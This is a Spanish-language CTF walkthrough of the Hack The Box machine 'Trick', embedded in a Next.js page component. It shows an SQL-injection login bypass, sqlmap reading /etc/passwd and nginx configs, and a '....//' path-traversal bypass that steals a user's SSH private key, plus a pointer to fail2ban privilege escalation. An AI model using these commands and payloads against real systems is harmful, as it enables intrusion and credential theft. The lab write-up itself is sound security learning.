import { Highlighter } from "../../utils/SyntaxHighlighter"
import { Paragraph } from "../../Components/Paragraph"
import { ContentBlock } from "../../Layout/ContentBlock"
import { SubTitle } from "../../Components/SubTitle"
import { Anchor } from "../../Components/Anchor"
import Image from 'next/image'

export function Trick() {
  return <>
      <ContentBlock>
          <SubTitle>Rust Scan</SubTitle>
          <Paragraph>
            Empezamos con un <i>whatweb</i> y nuestro escaneo habitual, usaremos 
            <Anchor src={"https://github.com/RustScan/RustScan"}> RustScan.</Anchor>
          </Paragraph>
          <Highlighter
            text={`
root@loe# whatweb 10.10.11.166
http://10.10.11.166 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.14.2], IP[10.10.11.166], Script, Title[Coming Soon - Start Bootstrap Theme], nginx[1.14.2]
            `}
          />
          <Highlighter
              text={`
root@loe# rustscan -a 10.10.11.166 -- -sS -n -Pn
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
--------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

Open 10.10.11.166:25
Open 10.10.11.166:22
Open 10.10.11.166:53
Open 10.10.11.166:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-19 16:20 -04
Initiating SYN Stealth Scan at 16:20
Scanning 10.10.11.166 [4 ports]
Discovered open port 53/tcp on 10.10.11.166
Discovered open port 80/tcp on 10.10.11.166
Discovered open port 22/tcp on 10.10.11.166
Discovered open port 25/tcp on 10.10.11.166
Completed SYN Stealth Scan at 16:20, 0.42s elapsed (4 total ports)
Nmap scan report for 10.10.11.166
Host is up, received user-set (0.38s latency).
Scanned at 2022-09-19 16:20:05 -04 for 1s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
25/tcp open  smtp    syn-ack ttl 63
53/tcp open  domain  syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.54 seconds
    Raw packets sent: 4 (176B) | Rcvd: 4 (176B)
              `}
            />
            <Paragraph>Tenemos cuatro puertos abiertos, y esta montado con <Anchor src={'https://www.plesk.com/blog/various/nginx-configuration-guide/'}>NGINX</Anchor> veremos que servicios corren...</Paragraph>
            <Highlighter
              text={`
root@loe# rustscan -a 10.10.11.166 -p 22,25,53,80 -- -sCV
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
  --------------------------------------
😵 https://admin.tryhackme.com

Open 10.10.11.166:25
Open 10.10.11.166:53
Open 10.10.11.166:22
Open 10.10.11.166:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-19 16:33 -04

Nmap scan report for 10.10.11.166
Host is up, received reset ttl 63 (0.41s latency).
Scanned at 2022-09-19 16:33:46 -04 for 52s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5Rh57OmAndXFukHce0Tr4BL8CWC8yACwWdu8VZcBPGuMUH8VkvzqseeC8MYxt5SPL1aJmAsZSgOUreAJNlYNBBKjMoFwyDdArWhqDThlgBf6aqwqMRo3XWIcbQOBkrisgqcPnRKlwh+vqArsj5OAZaUq8zs7Q3elE6HrDnj779JHCc5eba+DR+Cqk1u4JxfC6mGsaNMAXoaRKsAYlwf4Yjhonl6A6MkWszz7t9q5r2bImuYAC0cvgiHJdgLcr0WJh+lV8YIkPyya1vJFp1gN4Pg7I6CmMaiWSMgSem5aVlKmrLMX10MWhewnyuH2ekMFXUKJ8wv4DgifiAIvd6AGR
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAoXvyMKuWhQvWx52EFXK9ytX/pGmjZptG8Kb+DOgKcGeBgGPKX3ZpryuGR44av0WnKP0gnRLWk7UCbqY3mxXU0=
|   256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGY1WZWn9xuvXhfxFFm82J9eRGNYJ9NnfzECUm0faUXm
25/tcp open  smtp    syn-ack ttl 63 Postfix smtpd
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp open  domain  syn-ack ttl 63 ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid:
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    syn-ack ttl 63 nginx 1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.28 seconds
    Raw packets sent: 8 (328B) | Rcvd: 5 (216B)
              `}
            />
        <Paragraph>
          En el puerto 53 tenemos un dns intentaremos atacarlo con <i>dig</i>, ingresando 
          a la ip: <i>10.10.11.166</i> de la maquina vemos un formulario de correo en este caso vamos directo al ataque de la <i>DNS</i>.
        </Paragraph>
        <Image
          layout="responsive"
          src="/trick/trick_first.webp"
          alt="trick.htb image"
          width={600}
          height={378}
        />
        <Highlighter
          text={`
root@loe# dig axfr trick.htb @10.10.11.166
; <<>> DiG 9.16.27-Debian <<>> axfr trick.htb @10.10.11.166
;; global options: +cmd
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.		604800	IN	NS	trick.htb.
trick.htb.		604800	IN	A	127.0.0.1
trick.htb.		604800	IN	AAAA	::1
preprod-payroll.trick.htb. 604800 IN	CNAME	trick.htb.
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 356 msec
;; SERVER: 10.10.11.166#53(10.10.11.166)
;; WHEN: Mon Sep 19 17:09:50 -04 2022
;; XFR size: 6 records (messages 1, bytes 231)
          `}
        />
        <Paragraph>
          Agregamos el nuevo subdominio al <i>/etc/hosts</i>, preprod-payroll.trick.htb e ingresamos a la pagina vemos que nos 
          redirige a <i>http://preprod-payroll.trick.htb/login.php</i> con un panel de login. Hechemos un vistaso al codigo
          fuente <i>ctrl + u</i> al final notamos que hace la peticion a:
        </Paragraph>
        <Image
          layout="responsive"
          src="/trick/trick_preprod_login_code.webp"
          alt="trick.htb image"
          width={600}
          height={311}
        /> 
        <Paragraph>
          Intentemos inyectar SQL <i>admin' or true-- -</i> en el <i>Username</i> ¡wala! nos deja ingresar... vaya seguridad
        </Paragraph>
       <Image
          layout="responsive"
          src="/trick/trick_login.webp"
          alt="trick.htb image"
          width={600}
          height={311}
        />
        <Paragraph>
          en este punto sacamos el <i>burpsuite</i> y notamos que las peticiones lo hace al mismo archivo <i>/var/www/payroll/admin_class.php</i>, cuando
          ingresamos por la url vemos lo siguiente:
        </Paragraph>
        <Image
          layout="responsive"
          src="/trick/trick_action_save_payroll.webp"
          alt="trick.htb image"
          width={600}
          height={225}
        />
         <Image
          layout="responsive"
          src="/trick/trick_preprod_login_action_login.webp"
          alt="trick.htb image"
          width={600}
          height={204}
        />
        <Paragraph>
          al abrir el nuevo subdominio vemos que la url puede ser manipulada con el parametro <i>page=</i>
        </Paragraph>
        <Image
          layout="responsive"
          src="/trick/trick_page_var.webp"
          alt="trick.htb image"
          width={600}
          height={204}
        />
        <Paragraph>
          esto nos da a pensar que es sensible a <Anchor src={'https://owasp.org/www-community/attacks/Path_Traversal'}>Path Traversal Attack</Anchor> 
          sin embargo nosotros usaremos <i>sqlmap </i> con estos datos recolectados hasta ahora.
        </Paragraph>
        <Image
          layout="responsive"
          src="/trick/trick_burp_employee.webp"
          alt="trick.htb image"
          width={812}
          height={321}
        />
        <Highlighter
          text={`
root@loe# sqlmap --url "http://preprod-payroll.trick.htb/ajax.php?action=save_employee" --data "id=&firstname=loefirst&middlename=&lastname=loelast&department_id=1&position_id=1&salary=2000" --file-read "/etc/passwd" --batch --dbs --threads 10 --current-user --current-db
...

Parameter: id (POST)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: id=(SELECT (CASE WHEN (2945=2945) THEN '' ELSE (SELECT 3662 UNION SELECT 7138) END))&firstname=loefirst&middlename=&lastname=loelast&department_id=1&position_id=1&salary=2000
---Rust Scan
[22:25:48] [INFO] the back-end DBMS is MySQL
web application technology: PHP, Nginx 1.14.2
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[22:25:48] [INFO] fetching current user
[22:25:48] [INFO] retrieving the length of query output
[22:25:48] [INFO] resumed: 14
[22:25:48] [INFO] resumed: remo@localhost
current user: 'remo@localhost'
[22:25:48] [INFO] fetching current database
[22:25:48] [INFO] retrieving the length of query output
[22:25:48] [INFO] resumed: 10
[22:25:48] [INFO] resumed: payroll_db
current database: 'payroll_db'
...
[22:25:52] [INFO] fetching file: '/etc/passwd'
[22:25:52] [INFO] retrieving the length of query output
[22:25:52] [INFO] resumed: 4702
...
[22:25:52] [INFO] retrieving the length of query output
[22:25:52] [INFO] retrieved: 4
[22:25:57] [INFO] retrieved: 2351           
[22:25:5Rust Scan7] [INFO] the local file '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd' and the remote file '/etc/passwd' have the same size (2351 B)
files saved to [1]:
[*] /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd (same file)

[22:25:57] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb'

root@loe# cat /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd
...
mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:118:65534::/run/sshd:/usr/sbin/nologin
postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin
bind:x:120:128::/var/cache/bind:/usr/sbin/nologin
michael:x:1001:1001::/home/michael:/bin/bash
`}
        />
        <Paragraph>
          dato nuevo tenemos un usuario <i>michael </i> no olvidemos que la Web esta montada con <Anchor src={"https://docs.nginx.com/nginx/admin-guide/web-server/serving-static-content/"}>NGINX </Anchor> 
          intetaremos leer el archivo de configuracion que tiene este servicio, despues de descargar una copia en burpsuite de la peticion al guardar nuevo empleado.
        </Paragraph>
        <Image
          layout="responsive"
          src="/trick/trick_burp_employee.webp"
          alt="trick.htb image"
          width={812}
          height={321}
        />
        <Highlighter
          text={`
root@loe# sqlmap -r trick_burp_nginx_FILE.req --batch --dbms mysql --threads 10 --file-read=/etc/nginx/nginx.conf

[00:08:56] [INFO] parsing HTTP request from 'trick_burp_nginx_FILE.req'
[00:09:03] [WARNING] provided value for parameter 'id' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[00:09:03] [WARNING] provided value for parameter 'middlename' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[00:09:03] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: id=(SELECT (CASE WHEN (8198=8198) THEN '' ELSE (SELECT 7639 UNION SELECT 6019) END))&firstname=loe&middlename=&lastname=loelast&department_id=1&position_id=1&salary=2000
---
[00:09:04] [INFO] testing MySQL
[00:09:04] [INFO] confirming MySQL
[00:09:04] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[00:09:04] [INFO] fingerprinting the back-end DBMS operating system
[00:09:04] [INFO] the back-end DBMS operating system is Linux
[00:09:04] [INFO] fetching file: '/etc/nginx/nginx.conf'

[00:17:49] [INFO] retrieving the length of query output
[00:17:49] [INFO] retrieved: 4
[00:17:53] [INFO] retrieved: 1482           
[00:17:53] [INFO] the local file '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_nginx.conf' and the remote file '/etc/nginx/nginx.conf' have the same size (1482 B)
files saved to [1]:
[*] /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_nginx.conf (same file)

[00:17:53] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb'

[*] ending @ *************
[*] ending @ *************
 
          `}
        />
        <Highlighter
          text={`
root@loe# cat /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_nginx.conf
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;

events {
	worker_connections 768;
	# multi_accept on;
}

http {

	##
	# Basic Settings
	##

	sendfile on;
	tcp_nopush on;
	tcp_nodelay on;
	keepalive_timeout 65;
	types_hash_max_size 2048;
	# server_tokens off;

	# server_names_hash_bucket_size 64;
	# server_name_in_redirect off;

	include /etc/nginx/mime.types;
	default_type application/octet-stream;

	##
	# SSL Settings
	##

	ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # Dropping SSLv3, ref: POODLE
	ssl_prefer_server_ciphers on;

	##
	# Logging Settings
	##

	access_log /var/log/nginx/access.log;
	error_log /var/log/nginx/error.log;

	##
	# Gzip Settings
	##

	gzip on;

	# gzip_vary on;
	# gzip_proxied any;
	# gzip_comp_level 6;
	# gzip_buffers 16 8k;
	# gzip_http_version 1.1;
	# gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;

	##
	# Virtual Host Configs
	##

	include /etc/nginx/conf.d/*.conf;
	include /etc/nginx/sites-enabled/*;
}


#mail {
#	# See sample authentication script at:
#	# http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript
# 
#	# auth_http localhost/auth.php;
#	# pop3_capabilities "TOP" "USER";
#	# imap_capabilities "IMAP4rev1" "UIDPLUS";
# 
#	server {
#		listen     localhost:110;
#		protocol   pop3;
#		proxy      on;
#	}
# 
#	server {
#		listen     localhost:143;
#		protocol   imap;
#		proxy      on;
#	}
#}
          `}
        />
        <Paragraph>
          escaneamos este archivo <i>include /etc/nginx/sites-enabled/default;</i> que es el enlace simbólico predeterminado del host en el servidor Web 
        </Paragraph>
        <Highlighter
          text={`
root@loe# sqlmap -r trick_burp_nginx_FILE.req --batch --dbms mysql --threads 10 --file-read=/etc/nginx/sites-enabled/default
...
root@loe# cat /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-enabled_default
server {
	listen 80 default_server;
	listen [::]:80 default_server;
	server_name trick.htb;
	root /var/www/html;

	index index.html index.htm index.nginx-debian.html;

	server_name _;

	location / {
		try_files $uri $uri/ =404;
	}

	location ~ \.php$ {
		include snippets/fastcgi-php.conf;
		fastcgi_pass unix:/run/php/php7.3-fpm.sock;
	}
}


server {
	listen 80;
	listen [::]:80;

	server_name preprod-marketing.trick.htb;

	root /var/www/market;
	index index.php;

	location / {
		try_files $uri $uri/ =404;
	}

  location ~ \.php$ {
      include snippets/fastcgi-php.conf;
      fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;
  }
}

server {
  listen 80;
  listen [::]:80;

  server_name preprod-payroll.trick.htb;

  root /var/www/payroll;
  index index.php;

  location / {
      try_files $uri $uri/ =404;
  }

  location ~ \.php$ {
      include snippets/fastcgi-php.conf;
      fastcgi_pass unix:/run/php/php7.3-fpm.sock;
  }
}
          `}
        />
        <Paragraph>
          vemos que el servidor de <i>preprod-marketing.trick.htb</i> esta bajo el directorio <i>/var/www/market/index.php</i>, hacemos el ultimo escan.
        </Paragraph>
        <Highlighter
          text={`
root@loe# sqlmap -r trick_burp_nginx_FILE.req --batch --dbms mysql --threads 10 --file-read=/var/www/market/index.php
...
root@loe# cat /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_var_www_market_index.php
<?php
  $file = $_GET['page'];
  
  if(!isset($file) || ($file=="index.php")) {
    include("/var/www/market/home.html");
  }
  else{
    include("/var/www/market/".str_replace("../","",$file));
}
          `}
        />
        <Paragraph>
          este script es el que buscabamos la variable <i>page</i> que es sensible a <i>Path Traversal Attack</i>, vemos que en la penultima linea 
          reemplaza '../' con espacio vacio asi que simplemente pondremos <i>http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//home/michael/.ssh/id_rsa</i>, 
          lo descargamos e ingresamos por ssh.
        </Paragraph>
        <Highlighter
          text={`
ssh -i id_rsa michael@10.10.11.166
Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
michael@trick:~$ whoami
michael
michael@trick:~$ sudo -l
Matching Defaults entries for michael on trick:
  env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
  (root) NOPASSWD: /etc/init.d/fail2ban restart
michael@trick:~$ 
    
          `}
        />
          <Paragraph>
            ahora toca escalar privilegio por <Anchor src={'https://hackmd.io/@tahaafarooq/privilege-escalation-fail2ban'}>fail2ban</Anchor> 
          </Paragraph>
          <Image
            layout='responsive'
            src='https://res.cloudinary.com/djc1umong/image/upload/v1663699518/trick_pwn_tfhebg.webp'
            width={702}
            height={672}
          />
      </ContentBlock>
    </>
  }